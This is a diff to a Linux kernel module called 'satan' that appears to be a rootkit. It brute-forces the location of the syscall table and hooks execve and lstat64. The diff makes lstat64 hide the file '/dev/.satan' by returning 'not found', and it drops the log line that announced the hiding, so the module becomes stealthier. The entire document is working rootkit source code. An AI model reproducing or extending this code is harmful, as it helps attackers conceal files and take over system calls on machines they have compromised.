@@ -1,6 +1,7 @@
 // Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
 #include "syscall_hijack.h"
 
+#include <linux/fs.h>
 #include <linux/kallsyms.h>
 #include <linux/module.h>
 
@@ -8,6 +9,8 @@
 
 #define BRUTEFORCE_ADDR_BEGIN 0xc0000000
 #define BRUTEFORCE_ADDR_END 0xe0000000
+
+#define SECRET_FILE "/dev/.satan"
 
 static bool found_sys_call_table = false;
 static bool hijacked = false;
@@ -24,7 +27,7 @@ asmlinkage int satan_execve(const char __user *filename,
                             const char __user *const __user *argv,
                             const char __user *const __user *envp)
 {
-        pr_info("satan: hijacked execve(%s, ...)\n", filename);
+        pr_info("satan: hijacked execve(%s, ...)\n", getname(filename)->name);
         return real_execve(filename, argv, envp);
 }
 
@@ -35,10 +38,7 @@ asmlinkage int (*real_lstat64)(const char __user *filename,
 asmlinkage long satan_lstat64(const char __user *filename,
                               struct stat64 __user *statbuf)
 {
-        pr_info("satan: hijacked lstat64(%s, ...)\n", filename);
-
-        if (!strncmp(filename, "/dev/.satan", strlen("/dev/.satan"))) {
-                pr_alert("satan: hiding file: %s\n", filename);
+        if (!strncmp(filename, SECRET_FILE, strlen(SECRET_FILE))) {
                 return -ENOENT;
         }
 
